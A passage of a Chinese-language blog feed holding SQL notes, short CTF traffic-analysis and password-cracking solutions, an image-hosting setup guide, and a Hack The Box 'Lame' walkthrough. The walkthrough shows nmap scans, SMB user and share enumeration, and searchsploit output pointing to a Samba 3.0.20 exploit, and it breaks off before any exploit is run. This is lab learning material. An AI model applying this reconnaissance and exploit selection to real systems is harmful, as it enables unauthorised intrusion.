class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  <span class="keyword">DISTINCT</span> SNO <span class="keyword">FROM</span> SPJ ；</span><br></pre></td></tr></table></figure><h2 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> CITY,JNO <span class="keyword">FROM</span> S,SPJ <span class="keyword">WHERE</span> spj.SNO<span class="operator">=</span>S.SNO;</span><br><span class="line">分为 自身 和自然 外连接 </span><br><span class="line"><span class="keyword">select</span> CITY,SPJ.SNO,S.SNO <span class="keyword">FROM</span> S,SPJ <span class="keyword">WHERE</span> spj.SNO<span class="operator">=</span>S.SNO ;</span><br><span class="line"><span class="keyword">select</span> SPJ.CITY <span class="keyword">FROM</span> S,SPJ <span class="keyword">WHERE</span> spj.SNO<span class="operator">=</span>S.SNO ;</span><br></pre></td></tr></table></figure><h2 id="联合查询-集合查询"><a href="#联合查询-集合查询" class="headerlink" title="联合查询(集合查询)"></a>联合查询(集合查询)</h2><blockquote><p>当您使用 <code>UNION</code> 操作符时，确保两个查询选择的列的数据类型兼容，并且两个查询的列数相同</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 看看实力</span></span><br><span class="line"><span class="keyword">select</span> qty <span class="keyword">from</span> spj <span class="keyword">union</span> <span class="keyword">select</span> sNO <span class="keyword">FROM</span> S;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="交集查询"><a href="#交集查询" class="headerlink" title="交集查询"></a>交集查询</h2><blockquote><p>&#96;intersect     </p></blockquote><h2 id="差集查询"><a href="#差集查询" class="headerlink" title="差集查询"></a>差集查询</h2><blockquote><p>&#96;EXCEPT</p></blockquote><h2 id="嵌套查询"><a href="#嵌套查询" class="headerlink" title="嵌套查询"></a>嵌套查询</h2><blockquote><p>知道一些运算符号就可以</p></blockquote><h4 id="IN"><a href="#IN" class="headerlink" title="IN"></a>IN</h4><blockquote><p>在where 子句中找到  IN  后接 select  查询 找到的列 在</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> QTY <span class="keyword">FROM</span> spj <span class="keyword">WHERE</span> QTY <span class="keyword">IN</span> (<span class="keyword">SELECT</span> QTY <span class="keyword">FROM</span> SPJ <span class="keyword">WHERE</span> QTY <span class="operator">&gt;</span> <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- IN之后需要包在括号里面</span></span><br></pre></td></tr></table></figure><h4 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h4><blockquote><p>all 和any 两个关键字 </p><blockquote><p>&#x3D; &gt; &lt; &lt;&#x3D; !&#x3D;</p></blockquote></blockquote><h4 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h4><blockquote><p>使用EXISTS 关键字<br>where 后使用EXISTS 查询结果   感觉类似于连接查询</p></blockquote><h1 id="增加数据"><a href="#增加数据" class="headerlink" title="增加数据"></a>增加数据</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> table_name</span><br><span class="line"><span class="keyword">VALUES</span> (value1,value2,value3,...);</span><br><span class="line"></span><br><span class="line">第二种形式需要指定列名及被插入的值：</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT INTO</span> table_name (column1,column2,column3,...)</span><br><span class="line"><span class="keyword">VALUES</span> (value1,value2,value3,...);</span><br></pre></td></tr></table></figure><h3 id="看看实力"><a href="#看看实力" class="headerlink" title="看看实力"></a>看看实力</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into s values(&quot;S7&quot;,&quot;中国&quot;,&quot;50&quot;,&quot;北京&quot;)</span><br></pre></td></tr></table></figure><h1 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4-28ctf急切刷题</title>
      <link href="/2024/04/28/4-28ctf%E5%88%B7%E9%A2%98/"/>
      <url>/2024/04/28/4-28ctf%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240428140724.png" alt="image.png"></p></blockquote><p>直接在响应头中看到管理的password</p><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><blockquote><p>ZIP直接爆破 四位数字</p></blockquote><h3 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h3><blockquote><p>打开看见是一个  jpg文件<br>直接010 <img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240428141851.png" alt="image.png"></p></blockquote><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><blockquote><p>这个真的是难到我了<br>不会<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240428144057.png" alt="image.png"><br>设置成这个就好了</p></blockquote><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><blockquote><p>直接 改 00 00</p></blockquote><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240428145943.png" alt="image.png"></p><blockquote><p>上传了一个flag.jpg 我们可以看到一个返回包<br>直接可以看到flag<br>flag</p></blockquote><h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><blockquote><p>过滤 http 包 跟踪第一个流<br>可以在 cookie 看到 用户和密码</p></blockquote><h2 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h2><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240428164847.png"></p><blockquote><p>过滤 ftp 包 直接直接看到flag.rar 直接分离包<br>foremost -dd    .pacp</p></blockquote><p>看到rar文件直接爆破 四位数字</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github+PicGo+obsidian</title>
      <link href="/2024/04/26/github-PicGo-obsidian%E5%9B%BE%E5%BA%8A%E8%AE%BE%E7%BD%AE/"/>
      <url>/2024/04/26/github-PicGo-obsidian%E5%9B%BE%E5%BA%8A%E8%AE%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426221530.png" alt="image.png"></p><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><blockquote><p>一直以来 博客的图床问题都是个大问题 ,如何找到一个 可靠并且 方便的搭建方式 非常重要<br>今天介绍一种 github+picGo+obsidian的搭建方式</p></blockquote><h3 id="准备github库"><a href="#准备github库" class="headerlink" title="准备github库"></a>准备github库</h3><blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426220013.png" alt="image.png"></p></blockquote><h3 id="生成个人github-token"><a href="#生成个人github-token" class="headerlink" title="生成个人github token"></a>生成个人github token</h3><blockquote><p>找到个人 设置<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426220145.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426220245.png" alt="image.png"><br>生成一个新token 或者已经有的直接用<br>新生成的token 需要记录下来 这可能是你最后一次 看见他……..</p></blockquote><h3 id="安装picgo"><a href="#安装picgo" class="headerlink" title="安装picgo"></a>安装picgo</h3><p>贴心的给你带个链接<a href="https://github.com/Molunerfinn/PicGo/releases">这是你心心念念的picgo的链接yo</a><br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426220614.png" alt="image.png"></p><h3 id="安装obsidian"><a href="#安装obsidian" class="headerlink" title="安装obsidian"></a>安装obsidian</h3><p><a href="https://obsidian.md/download">宝藏obsidian</a></p><h4 id="obsidian-插件安装"><a href="#obsidian-插件安装" class="headerlink" title="obsidian 插件安装"></a>obsidian 插件安装</h4><blockquote><p>进入 obsidian 的插件市场 </p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426220822.png" alt="image.png"></p><h4 id="配置-picgo"><a href="#配置-picgo" class="headerlink" title="配置 picgo"></a>配置 picgo</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426221016.png" alt="image.png"></p><blockquote><p>***注意设置一下 github为默认的 图床剩下的 </p></blockquote><h4 id="obsidian配置"><a href="#obsidian配置" class="headerlink" title="obsidian配置"></a>obsidian配置</h4><blockquote><p>这个就是默认的不用管就行 千万别动他</p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426221232.png" alt="image.png"></p><h3 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h3><blockquote><p>这个真的特别爽 ，喜欢的伙伴可以点点关注点点赞哟!!!</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 日常娱乐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常娱乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-LAME</title>
      <link href="/2024/04/25/lame/"/>
      <url>/2024/04/25/lame/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>机器信息</th><th>lame</th><th></th></tr></thead><tbody><tr><td>状态</td><td>退役</td><td></td></tr><tr><td>系统</td><td>linux</td><td></td></tr><tr><td>技巧</td><td>ftp服务器 vsftp 2.3.4  以及smb samba 3.0.20 用户枚举漏洞 msf getshell</td><td></td></tr></tbody></table><h3 id="循例信息收集"><a href="#循例信息收集" class="headerlink" title="循例信息收集"></a>循例信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span> </span><br><span class="line">└─# nmap  -sS   -p- 10.10.10.3  </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-20 16:06 CST</span><br><span class="line">Nmap scan report for 10.10.10.3</span><br><span class="line">Host is up (0.016s latency).</span><br><span class="line">Not shown: 65531 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">21/tcp  open  ftp</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 详细信息</span></span></span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)</span><br><span class="line">|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line">|_clock-skew: -3m49s</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ftp端口-21"><a href="#ftp端口-21" class="headerlink" title="ftp端口 21"></a>ftp端口 21</h2><blockquote><p>强扫描一下ftp</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.3.4</span><br><span class="line">|_ftp-bounce: bounce working!</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4.37</span><br><span class="line">OS details: DD-WRT v24-sp2 (Linux 2.4.37)</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line">   </span><br></pre></td></tr></table></figure><h3 id="445smb协议"><a href="#445smb协议" class="headerlink" title="445smb协议"></a>445smb协议</h3><table><thead><tr><th>看一下smb如何打</th><th>[smb 445| SMB 协议端口利用]</th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-enum-users: </span><br><span class="line">|   LAME\backup (RID: 1068)</span><br><span class="line">|     Full name:   backup</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\bin (RID: 1004)</span><br><span class="line">|     Full name:   bin</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\bind (RID: 1210)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\daemon (RID: 1002)</span><br><span class="line">|     Full name:   daemon</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\dhcp (RID: 1202)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\distccd (RID: 1222)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\ftp (RID: 1214)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\games (RID: 1010)</span><br><span class="line">|     Full name:   games</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\gnats (RID: 1082)</span><br><span class="line">|     Full name:   Gnats Bug-Reporting System (admin)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\irc (RID: 1078)</span><br><span class="line">|     Full name:   ircd</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\klog (RID: 1206)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\libuuid (RID: 1200)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\list (RID: 1076)</span><br><span class="line">|     Full name:   Mailing List Manager</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\lp (RID: 1014)</span><br><span class="line">|     Full name:   lp</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\mail (RID: 1016)</span><br><span class="line">|     Full name:   mail</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\man (RID: 1012)</span><br><span class="line">|     Full name:   man</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\msfadmin (RID: 3000)</span><br><span class="line">|     Full name:   msfadmin,,,</span><br><span class="line">|     Flags:       Normal user account</span><br><span class="line">|   LAME\mysql (RID: 1218)</span><br><span class="line">|     Full name:   MySQL Server,,,</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\news (RID: 1018)</span><br><span class="line">|     Full name:   news</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\nobody (RID: 501)</span><br><span class="line">|     Full name:   nobody</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\postfix (RID: 1212)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\postgres (RID: 1216)</span><br><span class="line">|     Full name:   PostgreSQL administrator,,,</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\proftpd (RID: 1226)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\proxy (RID: 1026)</span><br><span class="line">|     Full name:   proxy</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\root (RID: 1000)</span><br><span class="line">|     Full name:   root</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\service (RID: 3004)</span><br><span class="line">|     Full name:   ,,,</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\sshd (RID: 1208)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\sync (RID: 1008)</span><br><span class="line">|     Full name:   sync</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\sys (RID: 1006)</span><br><span class="line">|     Full name:   sys</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\syslog (RID: 1204)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\telnetd (RID: 1224)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\tomcat55 (RID: 1220)</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\user (RID: 3002)</span><br><span class="line">|     Full name:   just a user,111,,</span><br><span class="line">|     Flags:       Normal user account</span><br><span class="line">|   LAME\uucp (RID: 1020)</span><br><span class="line">|     Full name:   uucp</span><br><span class="line">|     Flags:       Account disabled, Normal user account</span><br><span class="line">|   LAME\www-data (RID: 1066)</span><br><span class="line">|     Full name:   www-data</span><br><span class="line">|_    Flags:       Account disabled, Normal user account</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">### 用户信息</span></span></span><br><span class="line">些用户是指在某个计算机系统或网络中创建的用户帐户。每个用户帐户都有一个唯一的标识符（RID），通常有一个用户名和一些其他信息，如全名或描述。用户帐户可以用来登录系统、执行特定任务或访问特定资源，具体取决于其权限和角色。</span><br><span class="line"></span><br><span class="line">Account disabled&quot; 意味着该用户帐户已被禁用或停用。</span><br><span class="line"></span><br><span class="line">| smb-enum-shares: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   \\10.10.10.3\ADMIN$: </span><br><span class="line">|     Type: STYPE_IPC</span><br><span class="line">|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))</span><br><span class="line">|     Users: 1</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\tmp</span><br><span class="line">|     Anonymous access: &lt;none&gt;</span><br><span class="line">|   \\10.10.10.3\IPC$: </span><br><span class="line">|     Type: STYPE_IPC</span><br><span class="line">|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))</span><br><span class="line">|     Users: 1</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\tmp</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|   \\10.10.10.3\opt: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: </span><br><span class="line">|     Users: 1</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\tmp</span><br><span class="line">|     Anonymous access: &lt;none&gt;</span><br><span class="line">|   \\10.10.10.3\print$: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Printer Drivers</span><br><span class="line">|     Users: 1</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\var\lib\samba\printers</span><br><span class="line">|     Anonymous access: &lt;none&gt;</span><br><span class="line">|   \\10.10.10.3\tmp: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: oh noes!</span><br><span class="line">|     Users: 1</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\tmp</span><br><span class="line">|_    Anonymous access: READ/WRITE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解析:</span><br><span class="line">- `\\10.10.10.3\ADMIN$`: 这是一个 IPC（Interprocess Communication）服务，允许管理员通过网络管理远程系统。它的路径是 `C:\tmp`，并且没有匿名访问权限。</span><br><span class="line">    </span><br><span class="line">- `\\10.10.10.3\IPC$`: 同样是一个 IPC 服务，路径也是 `C:\tmp`，但是允许匿名用户读写访问。</span><br><span class="line">    </span><br><span class="line">- `\\10.10.10.3\opt`: 这是一个磁盘树类型的共享资源，没有设置注释，路径是 `C:\tmp`，并且没有匿名访问权限。</span><br><span class="line">    </span><br><span class="line">- `\\10.10.10.3\print$`: 这是一个用于打印机驱动程序的共享资源，路径是 `C:\var\lib\samba\printers`，没有匿名访问权限。</span><br><span class="line">    </span><br><span class="line">- `\\10.10.10.3\tmp`: 这是一个磁盘树类型的共享资源，注释是 &quot;oh noes!&quot;，路径是 `C:\tmp`，并且允许匿名用户读写访问。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>|客户端链接共享资源|<a href="smb%20445.md#%E6%89%BE%E5%88%B0%E7%89%B9%E5%AE%9A%E7%9A%84%E8%B5%84%E6%BA%90%E5%A6%82%E4%BD%95%E5%81%9A?">找到特定的资源如何做?</a></p><h3 id="链接获取资源"><a href="#链接获取资源" class="headerlink" title="链接获取资源"></a>链接获取资源</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Password for [WORKGROUP\root]:</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        tmp             Disk      oh noes!</span><br><span class="line">        opt             Disk      </span><br><span class="line">        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))</span><br><span class="line">        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        WORKGROUP            LAME</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>看了一圈啥也没得唯一一个收获就是拿到了<br>samba 3.0.20-Debian   知道了版本 查一下</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> Exploit Title                      |  Path</span><br><span class="line">------------------------------------ ---------------------------------</span><br><span class="line">Samba 3.0.10 &lt; 3.3.5 - Format Strin | multiple/remote/10095.txt</span><br><span class="line">Samba 3.0.20 &lt; 3.0.25rc3 - &#x27;Usernam | unix/remote/16320.rb</span><br><span class="line">Samba &lt; 3.0.20 - Remote Heap Overfl | linux/remote/7701.txt</span><br><span class="line">Samba &lt; 3.6.2 (x86) - Denial of Ser | linux_x86/dos/36741.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注意一波这个***Samba 3.0.20 &lt; 3.0.25rc3 - ‘Usernam | unix&#x2F;remote&#x2F;16320.rb</p></blockquote><table><thead><tr><th>samba复现</th><th><a href="samba%203.0.20%20-3.0.25rc3.md">samba 3.0.20 